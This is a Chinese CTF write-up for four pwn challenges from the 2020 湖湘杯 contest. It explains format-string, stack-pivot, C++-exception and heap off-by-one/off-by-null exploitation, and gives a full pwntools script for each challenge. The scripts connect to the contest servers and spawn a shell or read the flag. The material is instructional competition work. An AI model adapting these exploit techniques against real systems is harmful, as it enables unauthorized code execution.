# 2020 湖湘杯 PWN WriteUp

阅读量 **323226**

|评论 **3**

|![](https://p0.ssl.qhimg.com/sdm/30_30_100/t01f942715e2a0f1a23.png)

发布时间 : 2020-11-05 16:30:29

 **x**

##### 译文声明

本文是翻译文章

译文仅供参考，具体内容表达以及含义原文为准。

![](https://p2.ssl.qhimg.com/t01c366df2d6d2aed10.jpg)

赛后竞赛的界面就关了，题目名称可能会有些不对。

## printf

这个题目的原型题是[google ctf sprint](https://ctftime.org/writeup/23032)。

程序首先是`mmap`了一个`0x4000000`大小的地址空间到`0x4000000`为内地址的内存中，然后拷贝了一大堆的格式化字符串，接着`scanf`读取用户输入的`16`个数字，之后进入`while`循环，在满足判断条件退出之前不断地调用`sprintf`函数。退出循环之后会存在一个`overflow`函数，可以溢出的字节是好像是由`sprintf`的结果指定的。

在比赛的过程中我是直接输入不同的值，观察跳出循环后的状态，发现当前九个数字为`0x20`的时候，最大就会溢出`0x40`个字节，当然这里`if`条件判断中也写了`v12<=0x20`。那么这里推测格式化字符串的效果就是将用户输入的某个位置的数字（很大的可能是第`9`个）赋值到`v12`中。

那么拿到这个溢出的漏洞之后剩下的就是执行`rop`了，这里比赛中脑子抽风，用了非常麻烦的方法，一共迁移了三次栈帧。其实可以直接将返回地址改为`main`函数，重新来一次溢出的。

    
    
    # encoding=utf-8
    from pwn import *
    
    file_path = "./printf"
    context.arch = "amd64"
    context.log_level = "debug"
    context.terminal = ['tmux', 'splitw', '-h']
    elf = ELF(file_path)
    debug = 0
    if debug:
        p = process([file_path])
        gdb.attach(p, "b *0x401181")
        libc = ELF('/lib/x86_64-linux-gnu/libc.so.6')
        one_gadget = 0x0
    
    else:
        p = remote('47.111.104.169', 55606)
        libc = ELF('/lib/x86_64-linux-gnu/libc.so.6')
        one_gadget = 0x0
    
    
    p.recvuntil("very interesting\n")
    rop_address = 0x4100000
    p_rdi_r = 0x0000000000401213
    p_rsi_r = 0x0000000000401211
    ret_add = 0x0000000000400629
    leave_r = 0x00000000004007ed
    read_plt = elf.plt['read']
    read_got = elf.got['read']
    puts_plt = elf.plt['puts']
    read_bss_add = 0x400e040
    index = 9
    for i in range(index):
        p.sendline(str(0x20))
    
    p.sendline(str(read_plt))
    for i in range(15 - index):
        p.sendline(str(0x400))
    
    payload = flat([
        # p_rdi_r, 0,
        p_rsi_r, rop_address, 0,
        read_plt,
        p_rdi_r, read_got,
        leave_r,
    ])
    
    payload2 = flat([
        puts_plt,
        p_rdi_r, 0,
        p_rsi_r, read_bss_add + 0x10, 0,
        leave_r,
    ])
    p.send(p64(rop_address)+ payload.ljust(0x38, b"\x00"))
    p.send(p64(read_bss_add) + payload2)
    libc.address = u64(p.recvline().strip(b"\n").ljust(8, b"\x00")) - libc.sym['read']
    log.success("libc address is {}".format(hex(libc.address)))
    
    p_rdx_r = 0x0000000000001b92 + libc.address
    
    # payload = flat([
    #     p_rdx_r, 0x200,
    #     p_rsi_r, read_bss_add + 0x50, 0,
    #     p_rdi_r, 0,
    #     read_plt
    # ])
    
    bin_sh = flat([
        p_rdi_r, libc.search(b"/bin/sh\x00").__next__(),
        libc.sym['system']
    ])
    
    # p.send(payload.ljust(0x40, b"\x00"))
    
    p.send(bin_sh)
    
    p.interactive()
    

## blend

题目的原型题目是[2017 DCTF flex](https://www.anquanke.com/post/id/89855)

程序在`name`的部分首先存在一个格式化字符串的漏洞。然后程序提供了三种操作`add,delete,show`，存在`UAF`漏洞，但是只能`add`两个堆块，这里没办法利用，同时题目给出了一个后门函数

![](https://p0.ssl.qhimg.com/t01da5838dda27d9b2c.png)

这里是利用`C++`的异常处理，抛出了一个异常，异常的名字很怪，可以在`bss`段中看到它。这里存在一个栈溢出的漏洞，可以溢出`0x8`字节，也就是可以直接覆盖`rbp`。但是程序开启了一个`Canary`的保护，那么漏洞利用的主要就在于异常处理了。先是通过`_cxa_allocate_exception`分配了一个`0x90`大小的堆块，然后在申请的空间中赋了字符串的值。这里在调试的时候发现其调用了`bss`段中的函数指针，一开始的想法就是修改这个指针，但是没有办法利用`UAF`。后面就是通过`_cxa_throw`函数抛出异常的过程了，这个时候查到了原型题目，发现`main`函数中存在`try
catch`的捕捉异常的结构，当抛出异常的时候就能直接被`main`函数捕捉到之后就会进入`catch`，这个时候`rbp`就会变成`main`函数的`ebp`，异常处理结束之后直接`leave,ret`了，并没有检查`canary`的值。

这里我们又能覆写`rbp`，同时可以利用`UAF`泄露出堆的地址，因此这里直接覆写`rbp`为堆的地址，那么在处理异常结束之后就会迁移栈帧到堆中，执行我们提前布置好的`rop`链。

需要注意的是在抛出异常的过程中会涉及到对堆中某些元素或者以某些元素为地址的写，因此需要提前布置好相关的地址和设计好`rop`的位置

    
    
    # encoding=utf-8
    from pwn import *
    
    file_path = "./blend"
    context.arch = "amd64"
    context.log_level = "debug"
    context.terminal = ['tmux', 'splitw', '-h']
    elf = ELF(file_path)
    debug = 0
    if debug:
        p = process([file_path])
        # gdb.attach(p, "b *$rebase(0x121c)")
        libc = ELF('/lib/x86_64-linux-gnu/libc.so.6')
        one_gadget = 0x0
    
    else:
        p = remote('47.111.104.169', 57404)
        libc = ELF('/lib/x86_64-linux-gnu/libc.so.6')
        one_gadget = 0x0
    
    
    def show_name():
        p.sendlineafter("your choice >", "1")
    
    
    def add(content=b"\n"):
        p.sendlineafter("your choice >", "2")
        p.sendafter("input note:", content)
    
    
    def delete(index):
        p.sendlineafter("your choice >", "3")
        p.sendlineafter("index>", str(index))
    
    
    def show():
        p.sendlineafter("your choice >", "4")
    
    
    def magic(content):
        p.sendlineafter("your choice >", "666")
        p.sendafter("what you want:", content)
    
    
    payload = "%p-%p"
    p.sendafter("enter a name: ", payload)
    show_name()
    p.recvuntil("Current user:")
    stack_address = int(p.recvuntil("-", drop=True), 16) + 0x2680
    libc.address = int(p.recvline(), 16) - 0x3c6780
    
    leave_r = 0x0000000000042361 + libc.address
    p_rdi_r = 0x0000000000021112 + libc.address
    p_rsi_r = 0x00000000000202f8 + libc.address
    
    bin_sh = flat([
        stack_address, stack_address,
        stack_address,
        p_rdi_r, libc.search(b"/bin/sh\x00").__next__(),
        libc.sym['system']
    ])
    
    add(bin_sh + b"\n")
    add(bin_sh + b"\n")
    delete(0)
    delete(1)
    show()
    p.recvuntil("index 2:")
    heap_address = u64(p.recvline().strip(b"\n").ljust(8, b"\x00"))
    
    log.success("stack address {}".format(hex(stack_address)))
    log.success("libc address {}".format(hex(libc.address)))
    log.success("heap address {}".format(hex(heap_address)))
    
    # gdb.attach(p, "b *$rebase(0x121c)\nb *$rebase(0x12c2)")
    magic(p64(heap_address + 0x10)*4 + p64(heap_address + 0x20)*2)
    
    p.interactive()
    

## only_add

这个题目堆调试的眼睛都瞎了

`add`是通过`realloc`分配的，并将地址写到了全局`buf`中，并且只有这一个分配函数，另一个函数就是`buf=0,close(stdout)`，只能调用一次。在`add`函数中有一个`off-by-one`的漏洞。

之前没有接触过`realloc`的堆题目，对其的了解仅限于`realloc(0)`相当于`free`。这里在调试的时候发现，当`realloc`的`size`小于原有的`size`的时候会对原有的`chunk`进行切割，并将切割后的部分做一个类似于`free`的操作。

这里没有`show`函数，因此只能通过覆写`stdout`来进行`libc`基址的泄露，那么首先就需要填满`tcache`。为了方便后面的`off-by-one`的利用，这里我们将`tcache`中的堆块分配为地址相邻的。具体的方法就是分配一个`0x500`附近的堆块，是的`0x500-size>0x410`（这里选择的`size`是`0x90`），也就是对`chunk`切割之后，剩余的`chunk`满足和`top`合并的要求，之后再次申请`size`大小的堆块，那么剩余部分就会合并到`top
chunk`中，显式的释放申请到的`chunk`即`realloc(0)`，此时`tcache`中就填充了一个`size`大小的堆块。重复`8`次，就可以得到一个包含有`main_arena`附近地址的`chunk`。

那么如何分配到这个`chunk`，并修改`chunk`中`main_arena`附近的地址指向`stdout`呢。这里采用的方法就是在`0x30`大小的堆块空间内布置三个堆块，通过`0x30`的第一个堆块`off-by-one`构造堆重叠，覆写`main_arena`附近的地址为`stdout`，通过`0x90`即上一步构造的`chunk` `off-by-one`构造堆重叠覆写`0x30`链表中第二个`chunk`的`fd`指针指向包含有`main_arena`附近的地址的`chunk`。这样就完成了构造，只需要申请三次`0x30`大小的堆块就可以分配到`stdout`附近的地址了。要满足这样的需要在第三个`0x30`大小的堆块（`tcache`中的第一个堆块）申请之前申请一个堆块用于堆重叠，需要在第`7`个`0x90`大小的堆块申请之前，申请一个堆块用于堆重叠，最终构造出的堆布局如下

![](https://p1.ssl.qhimg.com/t0194eb5972722fd8a3.png)

利用`0x5c0`地址的`chunk`覆写`0x670`地址的`chunk`的`size`位为`0xf1`，使其能够覆写`0x730,0x700`地址的`chunk`。覆写`0x730`堆块的`FD`指针的低一字节为`0xe0`即指向包含有`main_arena`附近地址的堆块。利用`0x760`大小的堆块覆写`0x7b0`大小的堆块的`size`使其能够覆写`0x7d0`的`fd`指针，将低二字节覆写为`stdout`的地址，这里需要`1/16`的爆破。

![](https://p2.ssl.qhimg.com/t014f3a38d4f559f39e.png)

可以看到这里申请三次`0x30`大小的堆块就可以覆写`stdout`了，在申请释放的过程中需要注意改变堆块的`size`，防止申请的堆块释放的时候又回到了`0x30`的链表中，这里之前用之前的堆重叠堆块覆写`size`位就可以。

在覆写`stdout`泄露得到`libc`基址之后，由于`stdout`并不符合一个堆块的要求，因此其在`realloc`函数中会报错。这里就需要调用`close`函数了，因为此时会清空`buf`指针。之后直接利用堆重叠覆写`tcache`的`fd`指向`free_hook-0x18`的位置，写入`cmd+system_address`。因为此时我们关闭了`stdout`，因此需要将命令设置为`cat
flag 1&>2`。

    
    
    # encoding=utf-8
    from pwn import *
    
    file_path = "./pwn"
    context.arch = "amd64"
    context.log_level = "debug"
    context.terminal = ['tmux', 'splitw', '-h']
    elf = ELF(file_path)
    debug = 0
    if debug:
        p = process([file_path])
        # gdb.attach(p, "b *$rebase(0xB1B)")
        libc = ELF('/lib/x86_64-linux-gnu/libc.so.6')
        one_gadget = 0x0
    
    else:
        p = remote('47.111.104.99', 51905)
        libc = ELF('./libc.so.6')
        one_gadget = 0x0
    
    
    def add(size, content=b"\n"):
        p.sendlineafter("choice:", "1")
        p.sendlineafter("Size:", str(size))
        p.sendafter("Data:", content)
    
    
    def add_without(size, content=b"\n"):
        p.sendline("1")
        sleep(0.1)
        p.sendline(str(size))
        sleep(0.1)
        p.send(content)
        sleep(0.1)
    
    
    def delete():
        p.sendlineafter("choice:", "1")
        p.sendlineafter("Size:", str(0))
    
    
    def delete_without():
        p.sendline("1")
        sleep(0.1)
        p.sendline(str(0))
        sleep(0.1)
    
    
    def close_stdout():
        p.sendlineafter("choice:", "2")
    
    
    stdout = 0xa760
    malloc_size = 0x4f0
    
    while True:
        try:
            for i in range(6):
                add(malloc_size)
                add(0x80)
                delete()
    
            add(malloc_size)
            add(0xa8)
            delete()
    
            add(malloc_size)
            add(0x80)
            delete()
    
            add(malloc_size)
            add(0x28)
            delete()
            add(malloc_size)
            add(0x28)
            delete()
            add(malloc_size)
            add(0x48)
            delete()
            add(malloc_size)
            add(0x28)
            delete()
    
            log.success("free unsorted bin chunk")
            add(0x3c0)
            add(0x80)
            delete()
    
            # gdb.attach(p, "b *$rebase(0xB1B)")
    
            add(0xa8, b"a" * 0xa8 + b"\xf1")
            delete()
            add(0x88)
            delete()
            add(0xe8, b"a" * 0x98 + p64(0x21) + b"\x00" * 0x18 + p64(0x21) + b"\xe0")
            delete()
    
            add(0x48, b"a" * 0x48 + b"\xc1")
            delete()
            add(0x28)
            delete()
            add(0xb8, b"a" * 0x28 + p64(0x91) + p16(stdout))
            delete()
    
            add(0xe8, b"a" * 0x98 + p64(0x21) + b"\x00" * 0x18 + p64(0x41))
            delete()
            add(0x28)
            delete()
            add(0x28)
            delete()
            add(0x28, p64(0xfbad2887 | 0x1000) + p64(0) * 3 + b"\x00")
    
            p.recvuntil(p64(0xfbad2887 | 0x1000), timeout=1)
            p.recv(0x18)
            libc.address = u64(p.recv(8)) + 0x60 - libc.sym['_IO_2_1_stdout_']
            log.success("libc address is {}".format(hex(libc.address)))
            if b"\x7f" in p64(libc.address):
                break
        except KeyboardInterrupt:
            exit(0)
        except:
            p.close()
            if debug:
                p = process([file_path])
    
            else:
                p = remote('47.111.104.99', 51905)
    
    close_stdout()
    
    p.recvuntil("Bye\n")
    # gdb.attach(p, "b *$rebase(0xB1B)")
    
    payload = b"a" * 0x98 + p64(0x21) + b"\x00" * 0x18 + p64(0x61) + p64(libc.sym['__free_hook'] - 0x18) + b"\n"
    add_without(0xe8, payload)
    delete_without()
    add_without(0x38)
    
    delete_without()
    
    payload2 = b"cat flag 1>&2".ljust(0x18, b"\x00") + p64(libc.sym['system']) + b"\n"
    add_without(0x38, payload2)
    
    # gdb.attach(p, "b *$rebase(0xB1B)")
    delete_without()
    
    p.interactive()
    

## babyheap

程序提供了四种操作`add,show,edit,delete`。其中`add`函数只能分配`0xF8`大小的字节，`edit`函数中存在一个`off-by-null`。比较经典的`2.27`下面的`off-by-null`的利用。但是由于这里不能写入`prev_size`位，因此需要想些办法。

在泄露出`libc`基址之后，通过释放四个`0x100`大小的堆块，在依次申请，使得第`2,3,4`大小的堆块的`prev_size`位残留有释放堆块时写入的`prev_size`。得到`prev_size`之后就可以利用`off-by-null`了。首先释放第`1`个堆块，利用第`2`个堆块改写`3`堆块的`PREV_INUSE`位，释放第`3`个堆块，此时`1,2,3`堆块合并，再依次申请三个堆块`1,3,5`，那么此时`2,3`中保存的堆块指针相同。

利用指向同一个堆块的两个指针构造`double
free`。覆写`free_hook`为`system`，释放包含有`/bin/sh`字符串的堆块即可`getshell`。

    
    
    # encoding=utf-8
    from pwn import *
    
    file_path = "./babyheap"
    context.arch = "amd64"
    context.log_level = "debug"
    context.terminal = ['tmux', 'splitw', '-h']
    elf = ELF(file_path)
    debug = 0
    if debug:
        p = process([file_path])
        # gdb.attach(p, "b *$rebase(0xD3B)")
        libc = ELF('/lib/x86_64-linux-gnu/libc.so.6')
        one_gadget = 0x0
    
    else:
        p = remote('47.111.96.55', 55103)
        libc = ELF('./libc.so.6')
        one_gadget = 0x0
    
    
    def add():
        p.sendlineafter(">>", "1")
    
    
    def show(index):
        p.sendlineafter(">>", "2")
        p.sendlineafter("index?", str(index))
    
    
    def edit(index, size, content):
        p.sendlineafter(">>", "3")
        p.sendlineafter("index?", str(index))
        p.sendlineafter("Size:", str(size))
        p.sendafter("Content:", content)
    
    
    def delete(index):
        p.sendlineafter(">>", "4")
        p.sendlineafter("index?", str(index))
    
    
    for i in range(7):
        add()
    add() # 7
    add()
    add() # 9
    for i in range(7):
        delete(i)
    
    delete(7)
    delete(8)
    for i in range(7):
        add()
    
    add() # 7
    show(7)
    
    p.recv()
    libc.address = u64(p.recvline().strip(b"\n").ljust(0x8, b"\x00")) - 0x250 - 0x10 - libc.sym['__malloc_hook']
    log.success("libc address {}".format(hex(libc.address)))
    
    
    add() # 8
    add() # 10
    add()
    add() # 12
    add() # 13
    add() # 14
    for i in range(7):
        delete(i)
    
    
    delete(10)
    delete(11)
    delete(12)
    delete(13)
    
    for i in range(7):
        add()
    
    add()
    add()
    add()
    add()
    
    
    for i in range(7):
        delete(i)
    
    
    delete(10)
    edit(12, 0xf8, "\x00")
    delete(13)
    
    for i in range(7):
        add()
    
    
    add() # 10
    add() # 13 == 11
    add() # 14
    add() # 15
    
    delete(13)
    delete(14)
    delete(11)
    
    # gdb.attach(p, "b *$rebase(0xD3B)")
    
    add() # 11
    edit(11, 0x20, p64(libc.sym['__free_hook']))
    add() # 13
    add() # 14
    edit(14, 0x20, "/bin/sh\x00")
    add() # 15
    edit(17, 0x20, p64(libc.sym['system']))
    delete(14)
    
    p.interactive()
    

## 参考

[google ctf sprint](https://ctftime.org/writeup/23032)

[2017 DCTF flex](https://www.anquanke.com/post/id/89855)

本文翻译自 [原文链接]()。如若转载请注明出处。

商务合作，文章发布请联系 anquanke@360.cn

本文由 **LYYL** 原创发布

转载，请参考[转载声明](https://www.anquanke.com/note/repost)，注明出处：
[https://www.anquanke.com/post/id/221334](/post/id/221334)

安全客 - 有思想的安全新媒体

本文转载自: []()

如若转载,请注明出处： []()

安全客 - 有思想的安全新媒体

分享到：![微信](https://p0.ssl.qhimg.com/sdm/28_28_100/t01e29062a5dcd13c10.png)

  * [CTF](/tag/CTF)

 **+1** __5赞

 __收藏

![](https://p3.ssl.qhimg.com/t01746f731cb508f164.png) LYYL

分享到：![微信](https://p0.ssl.qhimg.com/sdm/28_28_100/t01e29062a5dcd13c10.png)

